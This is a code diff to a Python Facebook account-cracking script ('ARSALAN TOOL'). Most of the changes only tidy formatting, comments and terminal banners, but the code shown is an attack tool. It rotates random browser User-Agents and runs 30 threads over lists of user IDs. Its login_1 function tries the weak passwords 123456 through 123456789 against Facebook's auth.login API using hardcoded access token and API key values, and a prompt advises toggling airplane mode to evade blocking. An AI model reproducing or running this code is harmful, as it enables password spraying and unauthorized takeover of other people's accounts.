@@ -65,6 +65,7 @@ def arsalan_approval():
     print("\x1b[1;37mStatus: \x1b[1;31mChecking Approval...")
 
    # Aapki apni custom key yahan set ho gayi hai
+time.sleep(2)
 print("\033[32;41m\t Welcome ARSALAN TOOL 🔥 \033[0m")
 
 # Initial setup and promotion
@@ -140,21 +141,17 @@ def windows():
     """
     Generates a modern, randomized Windows User-Agent string (Variant A).
     """
-    # Modernized older-style fallback but with updated Chrome builds
     aV = random.choice(range(10, 20))
     chrome_major_old = random.choice(range(100, 115))
     A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.1; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_old}.0.{random.choice(range(5000, 6500))}.0 Safari/537.36"
     
-    # Mid-range modern User-Agent
     bz = f"537.36"
     chrome_major_mid = random.choice(range(115, 125))
     B = f"Mozilla/5.0 (Windows NT {random.choice([10, 11])}.0; Win64; x64) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{chrome_major_mid}.0.{random.choice(range(6000, 6800))}.{random.choice(range(1, 150))} Safari/{bz}"
     
-    # WOW64 (32-bit browser on 64-bit OS) variant
     chrome_major_wow = random.choice(range(120, 130))
     C = f"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_wow}.0.{random.choice(range(6000, 6900))}.{random.choice(range(1, 150))} Safari/537.36"
     
-    # Cutting-edge modern User-Agent (Chrome 130 - 142+)
     chrome_latest = random.choice(range(130, 143))
     D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_latest}.0.{random.choice(range(6500, 7200))}.0 Safari/537.36"
     
@@ -165,23 +162,19 @@ def window1():
     """
     Generates a highly updated, modern Windows User-Agent string (Variant B).
     """
-    # Standard Modern Win 10/11 template
     chrome_major = random.choice(range(120, 140))
     build_1 = random.choice(range(6000, 7100))
     A = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major}.0.{build_1}.0 Safari/537.36"
     
-    # Alternative layout with specific patch versions
     chrome_major_alt = random.choice(range(125, 142))
     build_2 = random.choice(range(6200, 7150))
     patch_2 = random.choice(range(50, 250))
     B = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_alt}.0.{build_2}.{patch_2} Safari/537.36"
     
-    # Compatibility style for enterprise networks
     chrome_major_ent = random.choice(range(118, 135))
     build_3 = random.choice(range(5800, 6800))
     C = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{random.choice(range(110, 130))}.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_major_ent}.0.{build_3}.{random.choice(range(10, 190))} Safari/537.36"
     
-    # Ultra-latest builds (Chrome 140+)
     latest_build = random.randint(7000, 7500)
     latest_patch = random.randint(100, 300)
     chrome_ultra = random.choice(range(140, 146))
@@ -195,7 +188,6 @@ def window1():
 sys.stdout.write('\x1b]2;👑【 A.R.S.A.L.A.N 👑 】\x07')
 
 
-    # ARSALAN Clover Logo - Green - Version 13.4
 def ____banner____():
     if 'win' in sys.platform:
         os.system('cls')
@@ -378,11 +370,11 @@ def old_Tow():
     print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD A')
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mMETHOD B')
     linex()
-    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
+    meth = input(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE {W}(A/B): {Y}").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
-        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mTOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
+        print(f"       \x1b[38;5;196m(\x1b[1;37m®\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mUSE AIRPLANE MOD FOR GOOD RESULT{G}")
         linex()
         for uid in user:
             if meth == 'A':
@@ -441,33 +433,32 @@ def login_1(uid):
         sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mRAJA-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
         sys.stdout.flush()
         for pw in ('123456', '1234567', '12345678', '123456789'):
-                         data = {
-            'adid': str(uuid.uuid4()),
-            'format': 'json',
-            'device_id': str(uuid.uuid4()),
-            'cpl': 'true',
-            'family_device_id': str(uuid.uuid4()),
-            'credentials_type': 'device_based_login_password',
-            'error_detail_type': 'button_with_disabled',
-            'source': 'device_based_login',
-            'email': str(uid),
-            'password': str(pw),
-            'access_token': '350685531728|62f8ce9f74b12f84c123cc2342',
-            'generate_session_cookies': '1',
-            'meta_inf_fbmeta': '',
-            'advertiser_id': str(uuid.uuid4()),
-            'currently_logged_in_userid': '0',
-            'locale': 'en_US',
-            'client_country_code': 'US',
-            'method': 'auth.login',
-            'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.login.protocol',
-            'api_key': '882a8490361d98702bf97a021ddc14d'
-        }
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc2342',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol',
+                'api_key': '882a8490361d98702bf97a021ddc14d'
+            }
     except Exception as e:
         pass
-        
 
 
-
-    
+if __name__ == '__main__':
+    BNG_71_()
